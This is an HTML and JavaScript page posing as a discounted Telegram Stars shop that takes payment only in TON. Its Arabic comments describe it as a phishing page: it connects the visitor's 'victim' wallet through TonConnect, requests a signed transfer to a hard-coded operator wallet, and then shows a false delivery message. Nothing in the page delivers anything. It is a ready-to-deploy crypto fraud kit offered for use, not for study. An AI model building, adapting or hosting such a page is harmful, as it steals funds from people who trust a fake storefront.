<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Asset Gateway</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0e1621; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #17212b; padding: 30px; border-radius: 20px; width: 340px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; border: 1px solid #242f3d; }
        h2 { color: #24a1de; margin-bottom: 5px; font-size: 22px; }
        p.subtitle { color: #818d99; font-size: 12px; margin-bottom: 25px; }
        .input-group { text-align: left; margin-bottom: 18px; }
        label { display: block; color: #abaeb2; font-size: 11px; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #242f3d; background: #242f3d; color: white; box-sizing: border-box; outline: none; font-weight: bold; }
        .price-tag { font-size: 32px; font-weight: bold; margin: 20px 0; color: #ffffff; }
        .price-tag span { font-size: 18px; color: #24a1de; margin-left: 5px; }
        #ton-connect { display: flex; justify-content: center; margin-bottom: 20px; }
        .btn-buy { background: linear-gradient(90deg, #24a1de, #0088cc); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 4px 15px rgba(36, 161, 222, 0.3); }
        .payment-method { background: rgba(36, 161, 222, 0.1); border: 1px solid rgba(36, 161, 222, 0.3); border-radius: 10px; padding: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .payment-method img { width: 20px; }
        .promo-badge { color: #24a1de; font-size: 11px; margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="card">
        <h2>💎 Stars Terminal</h2>
        <p class="subtitle">Direct Institutional Liquidity</p>
        
        <div class="payment-method">
            <img src="https://ton.org/download/ton_symbol.png" alt="TON">
            <span style="font-size: 12px; font-weight: bold; color: #24a1de;">Exclusive Payment: TON Network</span>
        </div>

        <div id="ton-connect"></div>

        <div class="input-group">
            <label>Recipient ID</label>
            <input type="text" placeholder="@username" id="user">
        </div>
        
        <div class="input-group">
            <label>Star Quantity (Min: 500)</label>
            <input type="number" id="starsInput" value="1500" min="500" oninput="updatePrice()">
        </div>
        
        <div class="price-tag"><span id="totalPrice">11.05</span> <span>TON</span></div>
        
        <button class="btn-buy" onclick="sendPayment()">CONFIRM PURCHASE</button>
        
        <div class="promo-badge">⚡️ FLASH SALE: 35% DISCOUNT APPLIED</div>
        <p style="color: #4e5965; font-size: 10px; margin-top: 15px;">Market: <del>17.00 TON</del> | Our Rate: 11.05 TON</p>
    </div>

    <script>
        // إعداد الربط مع محفظة الضحية
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        function updatePrice() {
            const stars = document.getElementById('starsInput').value;
            const priceDisplay = document.getElementById('totalPrice');
            
            // سعر النجمة الواحدة = 0.007366 TON (خصم 35% عن Fragment)
            const ratePerStar = 0.007366;
            let finalPrice = stars * ratePerStar;
            
            // تحديث السعر الظاهر
            priceDisplay.innerText = finalPrice.toFixed(2);
        }

        async function sendPayment() {
            // التحقق من أن المحفظة متصلة
            if (!tonConnectUI.connected) {
                alert("Please connect your TON wallet to authorize the transaction.");
                return;
            }

            const stars = document.getElementById('starsInput').value;
            const finalPrice = stars * 0.007366;
            const nanoAmount = Math.floor(finalPrice * 1000000000).toString();

            // تجهيز العملية المسحوبة لمحفظتك
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 120, 
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
                    amount: nanoAmount 
                }]
            };

            try {
                // فتح المحفظة لطلب التوقيع (هنا يتم الصيد)
                await tonConnectUI.sendTransaction(transaction);
                alert("Transaction successful! Delivery in progress.");
            } catch (e) {
                alert("Transaction rejected or insufficient balance.");
            }
        }
    </script>
</body>
</html>
